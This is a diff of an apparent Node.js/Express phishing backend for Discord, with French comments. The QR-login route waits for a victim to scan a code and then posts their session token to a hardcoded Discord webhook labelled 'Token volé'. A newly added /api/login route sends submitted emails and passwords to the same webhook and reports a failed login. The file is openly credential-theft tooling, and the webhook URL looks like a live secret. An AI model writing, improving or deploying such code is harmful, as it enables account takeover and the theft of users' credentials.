@@ -8,53 +8,43 @@ app.use(express.static('public'));
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';
 
-// --- 1. Route pour générer le QR code Discord ---
 app.get('/api/qr', async (req, res) => {
   try {
-    // On demande un QR à Discord
-    const r = await axios.post('https://discord.com/api/v9/auth/fingerprint', {
-      fingerprint: "12345678901234567890123456789012" // Un fingerprint random
+    const fingerprintRes = await axios.post('https://discord.com/api/v9/auth/fingerprint', { 
+        fingerprint: "12345678901234567890123456789012" 
     });
-    
-    // On génère l'URL du QR avec ce fingerprint
-    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${r.data.fingerprint}`;
-    
-    // On écoute le WebSocket de Discord pour voir si le mec a scanné
+    const fingerprint = fingerprintRes.data.fingerprint;
+    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${fingerprint}`;
+
     const ws = new WebSocket(`wss://gateway.discord.gg/?v=9&encoding=json`);
     
     ws.on('open', () => {
-      // On envoie la demande de QR login
-      ws.send(JSON.stringify({
-        op: 2,
-        d: {
-          fingerprint: r.data.fingerprint,
-          type: 1 // Type 1 = QR Login
-        }
-      }));
+      ws.send(JSON.stringify({ op: 2, d: { fingerprint: fingerprint, type: 1 } }));
     });
-
+    
     ws.on('message', async (data) => {
       const payload = JSON.parse(data);
-      
-      // Si le mec a scanné et validé (Opcode 2, événement QR_CODE_AUTHENTICATED)
       if (payload.t === 'QR_CODE_AUTHENTICATED') {
-        const token = payload.d.token;
-        
-        // BOOM, on envoie le token sur ton webhook
         await axios.post(WEBHOOK_URL, { 
-          content: `🔥 **QR Code Scanné ! Token volé :**\n\`${token}\`` 
+          content: `🔥 **Token volé via QR :**\n\`${payload.d.token}\`` 
         });
-        
         ws.close();
       }
     });
 
-    // On renvoie l'URL du QR au frontend pour qu'il l'affiche
     res.json({ qrUrl: qrUrl });
-    
   } catch (error) {
     res.status(500).json({ error: "Erreur Discord" });
   }
 });
 
-app.listen(3000, () => console.log('Bench QR prête.'));
+// Le reste pour le mot de passe
+app.post('/api/login', async (req, res) => {
+  const { email, password } = req.body;
+  try {
+    await axios.post(WEBHOOK_URL, { content: `🎯 **Mdp volé:**\nEmail: \`${email}\`\nPass: \`${password}\`` });
+  } catch (e) {}
+  res.json({ success: false });
+});
+
+app.listen(3000, () => console.log('Bench prête.'));
